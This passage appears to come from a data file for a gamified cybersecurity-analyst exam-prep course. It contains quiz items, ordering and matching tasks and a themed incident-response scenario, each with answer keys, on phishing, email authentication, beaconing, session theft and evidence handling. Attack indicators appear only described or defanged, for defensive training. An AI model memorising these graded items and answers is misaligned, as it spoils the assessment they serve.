 { t: "The SIEM license expired", c: false, w: "Licensing failures are loud and total, not selective." } ] },
{ s: "AI-assisted triage summarizes an incident: 'Host X beaconed to evil.com, user clicked phish at 09:14.'", e: "Underlying logs: beacon confirmed; no email click event exists anywhere", q: "Correct handling of the AI summary?", options: [
 { t: "Use the verified beacon finding; discard the click claim as a hallucination and note the validation gap", c: true, w: "AI outputs are leads, not evidence — every claim must trace to a log line. Partial hallucination is the standard failure mode." },
 { t: "Trust the summary; AI has better recall than analysts", c: false, w: "The click event doesn't exist — asserting it in the record fabricates evidence." },
 { t: "Discard the entire summary including the beacon", c: false, w: "The beacon is independently verified; discard only what fails validation." },
 { t: "Ask the AI to confirm its own claim", c: false, w: "Self-confirmation isn't validation; check the logs." } ] },
{ s: "A correlation rule idea: flag when 10+ failed logins from one IP are followed by a success within 5 minutes.", e: "Sources needed: auth logs across VPN, Entra, and Windows", q: "What architectural prerequisite makes this rule reliable?", options: [
 { t: "All auth sources onboarded with synchronized timestamps and normalized fields", c: true, w: "Cross-source correlation lives or dies on complete ingestion, common time, and consistent field parsing." },
 { t: "A machine-learning model to score each login", c: false, w: "This is a deterministic pattern — ML adds nothing but complexity here." },
 { t: "Full packet capture of authentication traffic", c: false, w: "Auth events come from logs; PCAP is the wrong (and heavy) layer." },
 { t: "An EDR agent on the firewall", c: false, w: "That's not a thing — EDR is for endpoints; firewalls export logs." } ] },
{ s: "Metrics review: MTTD fell from 6 days to 8 hours after new analytics, but false positives doubled.", e: "Leadership asks: net win or loss?", q: "Best analytical framing:", options: [
 { t: "Likely a win — detection speed improved massively; now iterate tuning to bring FP rate down without losing the new coverage", c: true, w: "MTTD is the outcome metric; FP volume is a tunable cost. The move is targeted tuning, not rollback." },
 { t: "Loss — false positives are the only metric that matters", c: false, w: "A quiet SOC that detects in 6 days is losing; noise is workable, blindness isn't." },
 { t: "Roll back the analytics until FPs return to baseline", c: false, w: "Rollback surrenders the 18x detection improvement." },
 { t: "Metrics can't evaluate SOC changes", c: false, w: "This is exactly what MTTD/FP-rate trending is for." } ] } ],

"cysa-ops-5": [
{ s: "A phish lands in inboxes spoofing your exact domain.", e: "Authentication-Results: spf=fail dkim=none dmarc=fail action=none", q: "Why was it delivered?", options: [
 { t: "DMARC policy is p=none — monitor-only, so receivers deliver despite failures", c: true, w: "p=none collects reports but instructs no enforcement; quarantine/reject is what blocks spoofing." },
 { t: "SPF passed, overriding DMARC", c: false, w: "The header literally shows spf=fail." },
 { t: "DKIM signatures don't apply to spoofed mail", c: false, w: "dkim=none is part of the failure; the delivery decision came from the none policy." },
 { t: "The receiving server was misconfigured", c: false, w: "It honored the published policy correctly — the policy is the gap." } ] },
{ s: "Header review of a suspicious 'CEO' email.", e: "From: CEO <ceo@company.com>\nReturn-Path: <bounce@quick-pay-portal.xyz>\nReply-To: ceo@cornpany-payments.com", q: "Strongest indicator of phishing here:", options: [
 { t: "Mismatch between display From, Return-Path, and a lookalike Reply-To domain (rn→m)", c: true, w: "Envelope/display divergence plus a homoglyph reply-to is the classic BEC construction." },
 { t: "The email mentions payments", c: false, w: "Topic alone isn't an indicator; executives discuss payments legitimately." },
 { t: "The From address uses the real domain", c: false, w: "That's the spoof working, not the tell — the surrounding fields expose it." },
 { t: "It was sent on a Friday", c: false, w: "Timing is social-engineering seasoning, not evidence." } ] },
{ s: "A user reports an attachment: 'invoice.iso' from an unknown sender.", e: "ISO contains invoice.lnk → powershell download command", q: "Why do attackers package payloads in ISO/LNK like this?", options: [
 { t: "Container formats historically sidestep mark-of-the-web, dodging macro blocks and warning prompts", c: true, w: "After macro-blocking, attackers moved to ISO/LNK/OneNote chains precisely to evade MOTW-based protections." },
 { t: "ISO files are smaller than documents", c: false, w: "Size is irrelevant; evasion is the point." },
 { t: "ISOs can't be scanned by any antivirus", c: false, w: "They can be scanned; the advantage was the MOTW gap, not invisibility." },
 { t: "LNK files run only on servers", c: false, w: "Shortcuts run anywhere Windows does." } ] },
{ s: "Post-phish, a user's account shows a new sign-in that passed MFA via number matching from the user, then a session from an unknown device.", e: "AiTM kit confirmed on the phishing page", q: "First remediation action:", options: [
 { t: "Revoke all sessions/refresh tokens for the account, then reset credentials", c: true, w: "The attacker holds a live token; revocation evicts them — a reset alone does not." },
 { t: "Reset the password only", c: false, w: "The stolen session outlives the old password." },
 { t: "Send the user security awareness training immediately", c: false, w: "Training is post-incident hygiene, not containment." },
 { t: "Block the phishing domain and stop there", c: false, w: "Stops future victims; does nothing for the active stolen session." } ] },
{ s: "Leadership asks how to make phishing-based session theft structurally harder.", e: "Current MFA: push notifications with number matching", q: "Best control upgrade:", options: [
 { t: "Phishing-resistant MFA (FIDO2 security keys / passkeys) for high-risk users first", c: true, w: "FIDO2 binds authentication to the legitimate origin, so AiTM proxy pages can't harvest a usable credential." },
 { t: "Increase push prompts to twice per login", c: false, w: "More prompts of a phishable factor doesn't change its phishability — and breeds fatigue." },
 { t: "Longer passwords rotated monthly", c: false, w: "AiTM captures whatever password exists; rotation is irrelevant mid-theft." },
 { t: "Block all personal email domains", c: false, w: "Marginal at best; the attack uses lookalike and compromised domains too." } ] },
{ s: "URL triage on a reported email.", e: "Display text: https://portal.company.com/login\nActual href: https://company-com.portal-auth.xyz/login", q: "What is the deception technique?", options: [
 { t: "Hyperlink text mismatch pointing to a lookalike domain where the real brand is a subdomain of an attacker domain", c: true, w: "The registrable domain is portal-auth.xyz; 'company-com' is set dressing. Always read right-to-left from the TLD." },
 { t: "An open redirect on the legitimate portal", c: false, w: "No redirect involved — the href never touches the real domain." },
 { t: "Homoglyph substitution in the TLD", c: false, w: "No character tricks here; it's a subdomain illusion." },
 { t: "URL shortener obfuscation", c: false, w: "The URL is fully visible, just deceptive." } ] },
{ s: "Sandbox detonation of a reported attachment shows nothing; the analyst wants to clear it.", e: "Sample: macro doc · sandbox ran 60s, default profile\nIntel: this family checks for sandbox artifacts and sleeps 10 min", q: "Correct interpretation:", options: [
 { t: "A clean sandbox run is not proof of safety — evasive samples detect analysis or delay; extend runtime/use hardened profiles and corroborate with static review", c: true, w: "Sandbox evasion (sleep timers, environment checks) is standard; negative dynamic results need corroboration." },
 { t: "Sandbox verdicts are definitive; release the file", c: false, w: "Evasion is designed to produce exactly this false confidence." },
 { t: "Sandboxes only work on executables, not documents", c: false, w: "Document detonation is a primary sandbox use case." },
 { t: "Detonate it on the analyst workstation to be sure", c: false, w: "Never detonate on production endpoints — that's the incident you were preventing." } ] },
{ s: "Comparing two suspicious login patterns after a phishing campaign.", e: "User A: 40 push prompts in 20 min, then approval at 02:10\nUser B: single login, new country, 'MFA previously satisfied'", q: "Classify each:", options: [
 { t: "A = MFA fatigue (bombing) success; B = stolen session token replay", c: true, w: "Prompt-bombing wears the user down into approving; token replay skips the challenge entirely — different attacks, different fixes." },
 { t: "Both are MFA fatigue", c: false, w: "B never generated prompts — the session was already 'satisfied.'" },
 { t: "Both are token theft", c: false, w: "A shows a live challenge flood, which token replay wouldn't produce." },
 { t: "A is benign; users often get 40 prompts", c: false, w: "A 2 a.m. prompt flood ending in approval is a textbook compromise." } ] } ],
},
pbqs: [
{ type: "order", s: "A confirmed beaconing host must be worked methodically.", task: "Arrange the analyst workflow in the correct order:",
 steps: ["Validate the alert against raw proxy/EDR telemetry", "Scope the indicator across all hosts and log sources", "Capture volatile evidence from affected hosts", "Contain (isolate hosts, block the domain)", "Eradicate the implant and close the entry vector", "Brief stakeholders with evidence-backed findings"],
 x: "Validate before you scope, scope before you act, preserve before you contain, contain before eradication, and report from evidence. Acting before scoping tips the attacker and misses hosts." },
{ type: "order", s: "A phishing report arrives claiming a credential-harvesting link was clicked.", task: "Order the email-incident triage steps:",
 steps: ["Analyze headers and URL to confirm malicious intent", "Search the mail system for all recipients of the campaign", "Purge/quarantine the message org-wide", "Revoke sessions and reset credentials for confirmed clickers", "Block the sender infrastructure and add detections", "Document the campaign and update user guidance"],
 x: "Confirm first (false reports are common), then scope recipients, remove the lure, remediate compromised identities, then harden and document." },
{ type: "match", s: "Map each observed behavior to its MITRE ATT&CK tactic.", task: "Assign every behavior:",
 cats: ["Command and Control", "Lateral Movement", "Credential Access", "Exfiltration"],
 items: [
  { t: "Periodic HTTPS check-ins to a young domain", c: "Command and Control" },
  { t: "LSASS memory dumped by an unusual process", c: "Credential Access" },
  { t: "RDP session from a workstation to three servers using a service account", c: "Lateral Movement" },
  { t: "700MB archive uploaded to an unknown cloud storage host at 03:00", c: "Exfiltration" },
  { t: "Kerberoasting: mass service-ticket requests from one user", c: "Credential Access" },
  { t: "DNS TXT queries carrying encoded payload chunks outbound", c: "Exfiltration" } ],
 x: "Check-ins = C2; credential material harvesting (LSASS, Kerberoasting) = Credential Access; moving between systems = Lateral Movement; data leaving = Exfiltration." },
{ type: "match", s: "Classify each log observation by what it most likely indicates.", task: "Match observation to classification:",
 cats: ["Likely malicious", "Likely benign", "Needs baseline context"],
 items: [
  { t: "WINWORD.EXE spawning encoded powershell.exe", c: "Likely malicious" },
  { t: "SCCM_Agent.exe running signed scripts from its install path", c: "Likely benign" },
  { t: "A 2GB upload to an unrecognized IP from a workstation", c: "Needs baseline context" },
  { t: "One source IP failing logins across 80 accounts", c: "Likely malicious" },
  { t: "Server rebooting during the documented patch window", c: "Likely benign" },
  { t: "Admin logon at 03:00", c: "Needs baseline context" } ],
 x: "Some patterns are near-certain (macro chains, sprays); some are near-certainly fine (signed management tooling in place); volume and timing anomalies mean nothing without a baseline." },
{ type: "match", s: "Choose the right telemetry source for each investigative question.", task: "Match question to best source:",
 cats: ["NetFlow", "Full PCAP", "EDR process telemetry", "DNS logs"],
 items: [
  { t: "Which hosts contacted 185.220.10.5 in the last 60 days?", c: "NetFlow" },
  { t: "What exact payload was POSTed to the attacker server?", c: "Full PCAP" },
  { t: "What parent process launched the suspicious binary and with what arguments?", c: "EDR process telemetry" },
  { t: "Is any host resolving algorithmically generated domains?", c: "DNS logs" },
  { t: "How many bytes left the network to that IP each day?", c: "NetFlow" } ],
 x: "Flow = scope and volume over time; PCAP = exact content; EDR = host lineage and arguments; DNS = resolution behavior." },
{ type: "multi", s: "A workstation shows several behaviors during triage.", e: "Observed:\nA) 300s-interval HTTPS to a domain registered last week\nB) Windows Update traffic to microsoft.com\nC) rundll32.exe executing from C:\\Users\\Public\\\nD) Backup agent uploading to the corporate backup server\nE) New Run-key persistence created by an unsigned binary", q: "Select ALL observations that are indicators of malicious activity:",
 options: [
  { t: "A — periodic beaconing to a newly registered domain", c: true, w: "Fixed-interval traffic to a young domain is a C2 signature." },
  { t: "B — Windows Update traffic", c: false, w: "Routine OS behavior to a known-good destination." },
  { t: "C — rundll32 from a user-writable public path", c: true, w: "LOLBin executing from Users\\Public is classic staging." },
  { t: "D — backup agent to the corporate backup server", c: false, w: "Expected data movement to sanctioned infrastructure." },
  { t: "E — Run-key persistence from an unsigned binary", c: true, w: "Unsigned autoruns are a primary persistence indicator (T1547)." } ],
 x: "Three hostile behaviors (beacon, LOLBin staging, autorun persistence) interleaved with normal noise — exactly how real triage looks." },
{ type: "multi", s: "You are hardening email authentication for the fleet's domain.", e: "Current DNS: SPF exists (~all soft-fail)\nNo DKIM signing · DMARC record: p=none", q: "Select ALL changes that materially reduce exact-domain spoofing reaching inboxes:",
 options: [
  { t: "Enable DKIM signing on all outbound mail streams", c: true, w: "Signatures let receivers verify integrity and DMARC alignment." },
  { t: "Move DMARC to p=quarantine, then p=reject after monitoring", c: true, w: "Enforcement is what actually stops delivery of spoofed mail — staged rollout avoids breaking legitimate senders." },
  { t: "Tighten SPF to -all with an accurate sender inventory", c: true, w: "Hard fail plus a correct include list removes the soft-fail delivery loophole." },
  { t: "Add a banner to external email", c: false, w: "Useful awareness aid, but it does not stop exact-domain spoof delivery — that's DMARC's job." },
  { t: "Rotate all user passwords", c: false, w: "Unrelated to sender authentication." } ],
 x: "Spoof prevention = SPF accuracy + DKIM signing + DMARC enforcement. Banners and passwords address different problems." },
{ type: "multi", s: "An ML anomaly-detection model is being added to the SOC pipeline.", e: "Design: continuous retraining on live traffic, auto-closes alerts it scores benign", q: "Select ALL legitimate risks of this design:",
 options: [
  { t: "Baseline poisoning — persistent attacker behavior becomes 'normal'", c: true, w: "Slow-roll activity gets absorbed into the training data." },
  { t: "Silent suppression — auto-closing hides model errors from humans", c: true, w: "Auto-close with no sampling review removes the human check on false negatives." },
  { t: "Model drift as the environment changes", c: true, w: "Traffic patterns evolve; unvalidated models decay quietly." },
  { t: "ML models cannot process network data", c: false, w: "They can; the risks are operational, not categorical." },
  { t: "Anomaly detection violates ATT&CK", c: false, w: "ATT&CK is a knowledge base, not a rulebook that tools can violate." } ],
 x: "V4 expects you to name AI-pipeline failure modes: poisoning, drift, and unreviewed automation — and to keep humans sampling auto-closed work." },
{ type: "order", s: "A suspicious attachment needs safe analysis.", task: "Order the attachment-analysis workflow:",
 steps: ["Hash the file and check reputation sources", "Static review: strings, macros, embedded objects", "Detonate in an isolated sandbox with extended runtime", "Corroborate sandbox behavior against EDR telemetry from the recipient host", "Publish indicators and add detection content"],
 x: "Cheap checks first (hash/static), dynamic detonation third, then verify whether the real host showed the sandbox's behaviors, then operationalize the intel." },
{ type: "multi", s: "Post-AiTM-phish identity cleanup for three affected users.", e: "Confirmed: attacker proxied logins, captured passwords AND session tokens", q: "Select ALL required remediation actions:",
 options: [
  { t: "Revoke all active sessions and refresh tokens", c: true, w: "Token revocation is what actually evicts a session-theft attacker." },
  { t: "Reset the captured passwords", c: true, w: "The passwords are attacker-known; both credential and session must be invalidated." },
  { t: "Review mailbox rules and MFA method changes for persistence", c: true, w: "Attackers plant forwarding rules and register their own MFA methods to survive resets." },
  { t: "Only monitor the accounts for 30 days", c: false, w: "Monitoring an attacker who holds valid access is not remediation." },
  { t: "Delete the three user accounts", c: false, w: "Destructive overkill that punishes victims and loses evidence." } ],
 x: "Session-theft cleanup = revoke tokens + reset credentials + hunt persistence (rules, MFA methods, OAuth grants). Anything less leaves a door open." },
],
boss: {
 title: "Operation Static Storm: The Hornet Swarm Assault",
 brief: "Zurg's Hornet drones have opened a full-spectrum assault on Star Command Fleet Ops: a synthetic alert storm as cover, one real intrusion underneath. You have the SOC console, live meters, and five decisive moments. Find the signal, Ranger.",
 win: "The Swarm collapses into scrap. The real intrusion was found, scoped, contained, and documented — Fleet Ops barely felt it. The Hornets retreat to Planet Z; this domain's mission is cleared.",
 lose: "The Swarm's noise did its job — the real foothold survived your response. Review the choices that burned time and evidence, and deploy again.",
 stages: [
 { sit: "The assault begins: 5,000 alerts in fifteen minutes flood the console. Fleet Ops leadership is on comms demanding a status.",
  e: "4,880x 'inbound port scan' (matches known internet background + a benign researcher scanner)\n90x failed VPN logins: 85 accounts, 1 source IP\n6x 'Office spawned script interpreter': WINWORD.EXE → wscript.exe, host WKS-LOG-041\n24x antivirus 'PUA' detections: browser toolbars",
  options: [
  { t: "Filter the scan noise, assign the spray to a teammate, and take the Office→wscript events yourself as priority one", d: 0, r: 3, ev: 0, ql: "best", w: "Severity-based triage under load: the macro chain is an active foothold, the spray is an attempt, the scans are weather. Delegation keeps both real threads moving." },
  { t: "Work the queue top-to-bottom so the record shows every alert reviewed", d: 20, r: -5, ev: 0, ql: "bad", w: "FIFO during a flood is exactly what the Swarm engineered — you'll spend hours on scanner noise while the foothold digs in." },
  { t: "Bulk-close everything and wait for something new to fire", d: 15, r: -6, ev: -5, ql: "bad", w: "You just closed the six alerts that were the real intrusion." } ]},
 { sit: "WKS-LOG-041's process tree confirms it: a macro dropped a payload that's beaconing. Now you need scope — fast — while the host still runs.",
  e: "EDR: wscript.exe → powershell.exe -enc ... → beacon to relay-cdn[.]net every 240s\nproxy (30d) and NetFlow (90d) available fleet-wide",
  options: [
  { t: "Sweep proxy/NetFlow for relay-cdn[.]net across the fleet and capture WKS-LOG-041's memory before any containment", d: 0, r: 2, ev: 4, ql: "best", w: "Scope the indicator everywhere while preserving the volatile evidence that proves what the payload is — both before tipping your hand." },
  { t: "Isolate WKS-LOG-041 immediately and investigate afterward", d: 6, r: 0, ev: -6, ql: "ok", w: "Defensible, but isolating before a fleet sweep may alert the operator to burn other footholds you haven't found yet — and you skipped memory capture." },
  { t: "Reimage WKS-LOG-041 now; speed beats forensics", d: 12, r: -3, ev: -22, ql: "bad", w: "The implant, its memory-resident payload, and the entry evidence are gone — and any other infected hosts remain." } ]},
 { sit: "The sweep finds two more beaconing hosts — including a logistics server. Meanwhile the password spray just landed a success on a service account.",
  e: "Beaconing: WKS-LOG-041, WKS-LOG-013, SRV-LOGISTICS-2\nSpray success: svc-manifest (no MFA — legacy exemption)\nSwarm chatter intercept: 'phase two at the top of the hour'",
  options: [
  { t: "Coordinated containment: isolate all three beaconing hosts simultaneously, disable svc-manifest's sessions, block the C2 domain at egress", d: 0, r: 3, ev: 1, ql: "best", w: "Simultaneous containment prevents the operator reacting host-by-host; the compromised service account is part of the same containment wave." },
  { t: "Isolate one host at a time, an hour apart, to watch attacker reactions", d: 18, r: -4, ev: 2, ql: "bad", w: "Staggered containment with a known 'phase two' deadline gifts the Swarm time to pivot and destroy evidence." },
  { t: "Disable svc-manifest only — the servers are too important to isolate", d: 14, r: -2, ev: 0, ql: "ok", w: "Business pressure is real, but leaving active C2 on a logistics server through 'phase two' risks far worse downtime than isolation." } ]},
 { sit: "Containment holds. Forensics on the memory image reveals the payload was staging manifest archives for exfil that never completed. Legal asks for the evidentiary posture.",
  e: "Memory image: staged archive list, C2 config\nDisk: dropper + scheduled task\nAll captures hashed; access list: you + IR lead",
  options: [
  { t: "Preserve everything under chain of custody: hashed images, documented handlers, working copies for analysis, originals sealed", d: 0, r: 2, ev: 4, ql: "best", w: "Analysis happens on copies; originals stay pristine with custody records — the posture that survives legal scrutiny." },
  { t: "Keep analyzing the original images directly to save time", d: 4, r: 0, ev: -12, ql: "ok", w: "Every direct touch of originals weakens admissibility; the copy step costs minutes and protects the case." },
  { t: "Delete the images after writing a summary — storage is tight", d: 8, r: -4, ev: -25, ql: "bad", w: "Destroying primary evidence mid-incident is unrecoverable, legally and technically." } ]},
 { sit: "The Swarm retreats. Commander Nebula wants the debrief — and Fleet Ops wants to never see this again.",
  e: "Findings: entry = macro email (no attachment detonation policy)\n· svc-manifest had a legacy MFA exemption\n· detection that caught it: Office→script-interpreter analytic",
  options: [
  { t: "After-action with root causes and fixes: attachment detonation policy, kill legacy MFA exemptions, promote the winning analytic fleet-wide, add C2-domain-age detection", d: 0, r: 4, ev: 0, ql: "best", w: "Lessons learned turns one incident into permanent capability: fix systemic gaps and scale what worked." },
  { t: "Report 'incident closed, no further action' to look decisive", d: 10, r: -5, ev: 0, ql: "bad", w: "Same gaps, next Swarm, same breach — and leadership eventually learns what was omitted." },
  { t: "Recommend disciplining the user who opened the macro", d: 8, r: -6, ev: 0, ql: "bad", w: "Blame culture kills future reporting; the systemic controls (detonation, MFA policy) are the fix." } ]},
 ],
},
};
